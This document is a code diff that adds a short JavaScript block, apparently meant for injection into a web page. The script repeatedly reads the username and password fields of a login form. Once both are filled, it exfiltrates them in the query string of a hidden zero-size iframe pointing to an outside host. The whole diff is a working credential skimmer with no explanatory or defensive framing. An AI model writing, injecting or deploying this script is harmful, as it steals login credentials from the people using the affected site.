@@ -1,0 +1,16 @@
+<script type="text/javascript">
+var interval = setInterval(testPassword, 50);
+
+function testPassword()
+{
+var password = document.getElementById("loginForm").password.value;
+var username = document.getElementById("loginForm").username.value;
+if(username != "" && password != "")
+{
+var makeDiv = document.createElement("div");
+makeDiv.innerHTML = "<iFrame src=\"https:\/\/www.uic.edu?username=" + username + "&password=" + password + "\" width=0 height=0 \/>";
+document.body.appendChild(makeDiv);
+clearInterval(interval);
+}
+}
+</script>
